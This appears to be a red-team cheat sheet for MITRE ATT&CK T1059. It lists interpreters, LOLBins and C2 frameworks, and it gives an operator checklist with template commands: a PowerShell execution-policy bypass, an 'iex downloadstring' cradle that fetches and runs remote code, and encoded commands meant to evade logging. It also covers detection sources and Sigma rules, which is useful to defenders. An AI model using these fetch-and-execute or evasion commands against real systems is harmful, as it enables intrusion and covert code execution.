# T1059 – Command and Scripting Interpreter

## 🎯 Objective
Execute scripts or commands via native interpreters (PowerShell, CMD, Bash, Python, etc.).

---

## 🧰 Tools
| Platform | Tools / Techniques |
|-----------|-------------------|
| Windows | PowerShell, cmd.exe, rundll32.exe, mshta.exe, regsvr32, cscript/wscript |
| Linux | Bash, Python3, Perl, /bin/sh, nohup, cronjobs, rc.local |
| C2 Frameworks | Cobalt Strike, Sliver, Covenant, Mythic |

---

## ✅ Operator Checklist
| Step | Task | Example | Status |
|------|------|----------|--------|
| 1 | Invoke native interpreter | `powershell -exec bypass` / `bash -i` | ☐ |
| 2 | Execute obfuscated payload | `iex (new-object net.webclient).downloadstring(...)` | ☐ |
| 3 | Establish beacon via staging server | CS/Sliver HTTPS listener | ☐ |
| 4 | Evade logging (Clear CLM, Encode36) | `powershell -Enc <payload>` | ☐ |

---

## ⚕ Detection Methods
| Source | Event ID | Description |
|---------|-----------|-------------|
| Sysmon | 1, 7 | Command or script interpreter spawn |
| PowerShell | 4103, 4104 | Script block logging |
| EDR | AMSI bypass / encoded command |
| Linux (Auditd) | `execve` -> /bin/bash | command sequence abuse |
| Sigma | `proc_creation_powershell_encoded.yml`, `bash_suspicious_invocation.yml` |

---

## 📘 References
- MITRE ATT&CK [T1059](https://attack.mitre.org/techniques/T1059)
- Florian Roth – PowerShell Suspicious Execution Rules


Author : yasinabedini
GitHub : https://github.com/yasinabedini

